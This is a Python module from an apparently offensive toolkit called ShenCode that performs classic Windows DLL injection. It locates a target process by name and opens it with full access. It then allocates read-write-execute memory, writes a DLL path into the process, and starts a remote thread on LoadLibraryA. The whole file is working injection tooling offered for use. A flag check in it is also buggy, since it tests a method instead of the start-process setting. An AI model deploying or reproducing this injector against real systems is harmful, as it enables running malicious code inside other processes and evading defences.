########################################################
### ShenCode Module
###
### Name: DLL Injection
### Docs: https://heckhausen.it/shencode/README
### 
########################################################

import os
import subprocess
from time import sleep
from utils.style import *
from utils.helper import CheckFile
from utils.windef import *
from utils.winconst import *

CATEGORY    = 'inject'
DESCRIPTION = 'Inject a DLL into memory'

css = ConsoleStyles()
cs_print = css.console_print()

arglist = {
     'input':                    { 'value': '', 'desc': 'Input dll to inject' },
     'process':                  { 'value': None, 'desc': 'Process to inject into' },
     'start_process':            { 'value': False, 'desc': 'If set, the process will be started' }
}

def register_arguments(parser):
            parser.add_argument('-i', '--input', type=str, required=True, help=arglist['input']['desc'])
            parser.add_argument('-p', '--process', required=True, help=arglist['process']['desc'])
            parser.add_argument('-s', '--start-process', action='store_true', required=False, default=False, help=arglist['start_process']['desc'])

class module:
    import wmi, threading
    #from time import sleep
    import subprocess
    Author = 'psycore8'
    Version = '1.0.1'
    DisplayName = 'DLL-INJECTION'
    mem = any
    data_bytes = bytes
    pid = 0
    relay_input = False
    shell_path = '::inject::dll'

    def __init__(self, input, process, start_process):
            self.input_file: str = input
            self.target_process = process
            self.start_process = start_process

    def Start_Process(self):
        cs_print.note(f'Invoke process {self.target_process}')
        #os.system(self.target_process)
        subprocess.run(self.target_process)

    def get_proc_id(self):
        processes = self.wmi.WMI().Win32_Process(name=self.target_process)
        self.pid = processes[0].ProcessId
        cs_print.note(f'{self.target_process} process id: {self.pid}')
        return int(self.pid)
    
    def start_injection(self):
        if self.Start_Process:
            s = self.threading.Thread(target=self.Start_Process)
            s.start()
            sleep(3)
        self.pid = self.get_proc_id()
        ph = OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        if ph: cs_print.note('Opened a Handle to the process')
        mem = VirtualAllocEx(ph, None, len(self.data_bytes)+1, MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE) # type: ignore
        if mem:
             self.mem = mem
             cs_print.note(f'Allocated Memory at 0x{self.mem}')
        cs_print.note('Write to memory')
        WriteProcessMemory(ph, mem, self.data_bytes, len(self.data_bytes)+1, 0) # type: ignore
        th = CreateRemoteThread(ph, None, 0, LoadLibraryA, mem, 0, None)
        if th: cs_print.ok(f'Injected {self.input_file} into {self.target_process}')
        else:  cs_print.error('Error during process injection')
        CloseHandle(ph)
        CloseHandle(th)

    def process(self):
        css.module_header(self.DisplayName, self.Version)
        cs_print.note(f'Try to open dll file')
        if self.relay_input:
                self.data_bytes = self.input_file
        else:
          if CheckFile(self.input_file):
            css.action_open_file2(self.input_file)
            dll_file = os.path.abspath(self.input_file)
            self.data_bytes = dll_file.encode('utf-8')
          else:
            cs_print.error(f'File {self.input_file} not found or cannot be opened')
        self.start_injection()
        cs_print.ok('DONE!')